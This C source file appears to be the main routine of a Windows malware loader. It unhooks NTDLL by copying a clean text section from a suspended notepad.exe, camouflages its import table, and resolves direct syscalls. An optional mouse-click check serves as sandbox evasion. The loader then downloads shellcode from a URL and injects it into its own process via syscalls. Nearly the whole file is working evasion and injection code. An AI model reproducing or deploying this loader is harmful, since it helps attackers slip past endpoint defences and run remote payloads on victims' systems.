#include <Windows.h>

#include "Structs.h"
#include "Common.h"
#include "IatCamo.h"
#include "Debug.h"

// defining the '_fltused' symbol - defined in the CRT library
float _fltused = 0;

//#define ANTI_ANALYSIS

int main() {

	DWORD		dwProcessId = 0;
	HANDLE		hProcess = NULL, hThread = NULL;
	PBYTE		pPayload = NULL;
	SIZE_T		sPayloadSize = 0;

	PVOID pCleanNtdll = NULL;

	if (!ReadNtdllFromASuspendedProcess("notepad.exe", &pCleanNtdll)) {
#ifdef DEBUG
		PRINTA("[!] Failed To Read Clean NTDLL From Suspended Process\n");
#endif
		return -1;
	}

	if (!ReplaceNtdllTxtSection(pCleanNtdll)) {
#ifdef DEBUG
		PRINTA("[!] Failed To Patch Local NTDLL Text Section\n");
#endif
		return -1;
	}

	IatCamo();

	//--------------------------------------------------------------------------------------
	// get the addresses of the syscalls (ssns) and winapis

	if (!InitializeSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize Syscalls Structure \n");
#endif // DEBUG
		return -1;
	}
	//--------------------------------------------------------------------------------------


	//--------------------------------------------------------------------------------------
	// if 'ANTI_ANALYSIS' is defined - enable anti analysis features

#ifdef ANTI_ANALYSIS

	// monitoring mouse clicks for `20000` ms - that is 20 seconds
	if (!AntiAnal(20000)) {
#ifdef DEBUG
		PRINTA("[!] Detected A Virtualized Environment \n");
#endif // DEBUG
	}

#endif // ANTI_ANALYSIS

	if (!GetPayloadFromUrl(SHELLCODE_URL, &pPayload, &sPayloadSize)) {
#ifdef DEBUG
		PRINTA("[!] Failed To Download Payload From Url \n");
#endif
		return -1;
	}

#ifdef DEBUG
	PRINTA("[i] Injecting into current process ...\n");
#endif
	dwProcessId = GetCurrentProcessId();
	hProcess = GetCurrentProcess();
	hThread = GetCurrentThread();


	if (!RemoteMappingInjectionViaSyscalls(hProcess, hThread, pPayload, sPayloadSize, TRUE)) {
#ifdef DEBUG
		PRINTA("[!] Failed To Inject Payload \n");
#endif // DEBUG
		return -1;
	}
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}
